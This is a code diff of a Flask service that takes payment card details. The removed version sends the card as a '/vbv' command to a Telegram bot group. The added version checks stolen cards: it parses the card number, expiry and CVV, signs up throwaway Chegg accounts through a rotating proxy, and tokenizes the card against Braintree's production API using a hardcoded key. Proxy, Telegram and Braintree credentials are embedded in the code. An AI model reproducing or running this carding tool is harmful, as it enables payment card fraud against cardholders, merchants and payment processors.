@@ -1,83 +1,163 @@
-from flask import Flask, request, jsonify
-from telethon import TelegramClient
-import asyncio
+from flask import Flask, jsonify, request
+import requests
+import json
+import string
 import re
+import random
 
 app = Flask(__name__)
 
-# Telegram API credentials
-api_id = '25742938'
-api_hash = 'b35b715fe8dc0a58e8048988286fc5b6'
+# Proxy setup
+proxy = {
+    "http": "http://ugazuzfh-rotate:g5im737zry2x@p.webshare.io:80",
+    "https": "http://ugazuzfh-rotate:g5im737zry2x@p.webshare.io:80"
+}
 
-# Initialize the Telethon client with the session file
-client = TelegramClient('my_session', api_id, api_hash)
+# Function to extract details from card info
+def pregs(list_input):
+    arrays = re.findall(r'[0-9]+', list_input)
+    return arrays
 
-# Create a single event loop for the application
-loop = asyncio.get_event_loop()
+# Function to generate random email
+def generate_random_email():
+    domains = ["gmail.com", "yahoo.com", "hotmail.com"]
+    letters = string.ascii_lowercase
+    email = ''.join(random.choice(letters) for i in range(10)) + "@" + random.choice(domains)
+    return email
 
+# Function to generate random password
+def generate_random_password():
+    characters = string.ascii_letters + string.digits + string.punctuation
+    password = ''.join(random.choice(characters) for i in range(12))
+    return password
+
+# Route to process the request
 @app.route('/process_card', methods=['POST'])
 def process_card():
-    try:
-        card_info = request.json.get('card')
-        if not card_info:
-            return jsonify({'error': 'No card information provided'}), 400
+    data = request.json
+    card_info = data.get('card')
 
-        # Process the card information
-        vbv_command = f"/vbv {card_info}"
+    # Extracting card details
+    arrs = pregs(card_info)
+    cc = arrs[0]
+    month = arrs[1]
+    year = arrs[2]
+    cvc = arrs[3]
 
-        # Use the single event loop to run the Telethon coroutine
-        response = loop.run_until_complete(send_and_receive(vbv_command))
+    # Setting up the session
+    session = requests.Session()
+    session.proxies = proxy
 
-        return jsonify({'response': response})
-    except Exception as e:
-        return jsonify({'error': f'Internal server error: {e}'}), 500
+    # Signup process
+    url_signup = "https://gateway.chegg.com/auth-gate/"
+    email = generate_random_email()
+    password = generate_random_password()
 
-async def send_and_receive(message):
-    try:
-        # Start the client using the session file
-        await client.start()
-        
-        # Use the group's ID to get the entity
-        group_id = -4593530179  # Make sure to use the negative sign
-        entity = await client.get_entity(group_id)
-        
-        # Send message to the group
-        sent_message = await client.send_message(entity, message)
-        
-        # Wait for a few seconds to allow the bot to reply
-        await asyncio.sleep(5)  # Adjust the delay as needed
-        
-        # Fetch messages from the group and filter by reply_to_msg_id
-        response = await client.get_messages(entity, limit=10)
-        for msg in response:
-            if msg.reply_to and msg.reply_to.reply_to_msg_id == sent_message.id:
-                return modify_response(msg.text)
-        
-        return 'No response received'
-        
-    except Exception as e:
-        return f'Error communicating with Your Mom: {e}'
-    finally:
-        await client.disconnect()
+    payload_signup = json.dumps({
+        "query": "mutation Signup($userCredentials: UserCredentials!, $userProfile: UserProfile!, $clientId: String!) {\n  signUpUser(\n    userCredentials: $userCredentials\n    userProfile: $userProfile\n    clientId: $clientId\n  ) {\n    tokens {\n      idToken\n      accessToken\n      expires\n    }\n    encryptedEmail\n    encryptedCheggId\n    uuid\n  }\n}\n",
+        "variables": {
+            "userCredentials": {
+                "email": email,
+                "password": password
+            },
+            "userProfile": {
+                "sourceProduct": "core|CHGG",
+                "sourcePage": "chegg|payments"
+            },
+            "clientId": "CHGG"
+        },
+        "operationName": "Signup"
+    })
 
-def modify_response(response_text):
-    # Extract information using regular expressions
-    bin_match = re.search(r'Bin\s+(\d+)', response_text)
-    status_match = re.search(r'Estatus\s+(.+)', response_text)
-    info_match = re.search(r'Info\s+(.+)', response_text)
+    headers = {
+        'authority': 'gateway.chegg.com',
+        'accept': 'application/json',
+        'content-type': 'application/json',
+        'origin': 'https://www.chegg.com',
+        'referer': 'https://www.chegg.com/',
+        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
+    }
 
-    bin_number = bin_match.group(1) if bin_match else "N/A"
-    status = status_match.group(1) if status_match else "N/A"
-    response = info_match.group(1) if info_match else "N/A"
+    # Make the POST request to sign up
+    response_signup = session.post(url_signup, headers=headers, data=payload_signup)
 
-    # Format the response in a single line
-    formatted_response = (
-        f"Developed By : @xunez 🥇| Status : {status} |  "
-        f"Response : {response} | Chanel : @b3charge 🥇"
-    )
+    # Check if signup was successful
+    if response_signup.status_code == 200:
+        # Now navigate to the payments page (simulated)
+        url_payments = "https://www.chegg.com/my/payments"
+        session.get(url_payments, headers=headers)
 
-    return formatted_response
+        # Wait for the specific request to the GraphQL endpoint
+        url_graphql = "https://gateway.chegg.com/me-web-bff/graphql"
+        session.get(url_graphql, headers=headers)
+
+        # Fetch and format cookies from the response
+        cookies = session.cookies
+        cookies_value = '; '.join([f"{cookie.name}={cookie.value}" for cookie in cookies])
+
+        # Prepare the response
+        response_data = {
+            "cookies": cookies_value
+        }
+
+        # Now continue to the tokenization process
+        url_tokenize = "https://payments.braintree-api.com/graphql"
+
+        payload_tokenize = json.dumps({
+            "clientSdkMetadata": {
+                "source": "client",
+                "integration": "custom",
+                "sessionId": "e67551a3-cb40-47a7-a878-f9bd68d4716d"
+            },
+            "query": "mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) { tokenizeCreditCard(input: $input) { token creditCard { bin brandCode last4 cardholderName expirationMonth expirationYear binData { prepaid healthcare debit durbinRegulated commercial payroll issuingBank countryOfIssuance productId } } } }",
+            "variables": {
+                "input": {
+                    "creditCard": {
+                        "number": cc,
+                        "expirationMonth": month,
+                        "expirationYear": year,
+                        "cvv": cvc,
+                        "cardholderName": "Proshno gaming",
+                        "billingAddress": {
+                            "countryCodeAlpha2": "US",
+                            "locality": "Knoxville",
+                            "region": "Tennessee",
+                            "postalCode": "37932"
+                        }
+                    },
+                    "options": {
+                        "validate": False
+                    }
+                }
+            },
+            "operationName": "TokenizeCreditCard"
+        })
+
+        headers_tokenize = {
+            'authority': 'payments.braintree-api.com',
+            'method': 'POST',
+            'accept': '*/*',
+            'authorization': 'Bearer production_6mhyzqmw_k588b3w67tw7q2zs',
+            'braintree-version': '2018-05-10',
+            'content-type': 'application/json',
+            'origin': 'https://assets.braintreegateway.com',
+            'referer': 'https://assets.braintreegateway.com/',
+            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36'
+        }
+
+        # Send the tokenization request
+        response_tokenize = session.post(url_tokenize, headers=headers_tokenize, data=payload_tokenize)
+        response_json = response_tokenize.json()
+
+        # Fetch the token
+        tokenID = response_json['data']['tokenizeCreditCard']['token']
+        response_data["token"] = tokenID
+
+        return jsonify(response_data)
+    else:
+        return jsonify({"error": "Signup failed"}), 400
+
 
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(debug=True)
 
